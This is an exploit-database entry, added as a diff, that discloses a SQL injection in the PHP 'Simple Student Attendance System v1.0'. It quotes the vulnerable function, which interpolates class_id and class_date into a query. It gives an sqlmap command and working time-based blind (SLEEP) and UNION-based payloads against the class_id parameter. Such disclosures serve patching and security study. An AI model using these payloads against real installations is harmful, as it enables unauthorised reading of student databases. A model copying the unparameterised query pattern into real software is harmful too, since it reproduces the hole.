@@ -1,0 +1,40 @@
+id: 39394
+date: 03/04/2024
+title: Simple Student Attendance System v1.0 Time Based Blind & Union Based SQL Injection Vulnerability
+author: Gnanaraj Mauviel
+cves: 
+
+# Exploit Title: Simple Student Attendance System v1.0 -  'classid' Time Based Blind & Union Based SQL Injection
+# Exploit Author: Gnanaraj Mauviel (@0xm3m)
+# Vendor: oretnom23
+# Vendor Homepage: https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-attendance.zip
+# Version: v1.0
+# Tested on: Mac OSX, XAMPP, Apache, MySQL
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+Source Code(/php-attendance/classes/actions.class.php):
+
+public function attendanceStudents($class_id = "", $class_date = ""){
+if(empty($class_id) || empty($class_date))
+return [];
+$sql = "SELECT `students_tbl`.*, COALESCE((SELECT `status` FROM `attendance_tbl` where `student_id` = `students_tbl`.id and `class_date` = '{$class_date}' ), 0) as `status` FROM `students_tbl` where `class_id` = '{$class_id}' order by `name` ASC";
+$qry = $this->conn->query($sql);
+$result = $qry->fetch_all(MYSQLI_ASSOC);
+return $result;
+}
+
+-> sqlmap -u "http://localhost/php-attendance/?page=attendance&class_id=446&class_date=0002-02-20" --batch
+---
+Parameter: class_id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=attendance&class_id=446' AND (SELECT 5283 FROM (SELECT(SLEEP(5)))zsWT) AND 'nqTi'='nqTi&class_date=0002-02-20
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: page=attendance&class_id=446' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717671,0x7154766a5453645a7a4d497071786a6f4b647a5a6d4162756c72636b4a4555746d555a5a71614d4c,0x71767a7a71),NULL-- -&class_date=0002-02-20
+---
+
+#  0day.today [2024-03-06]  #
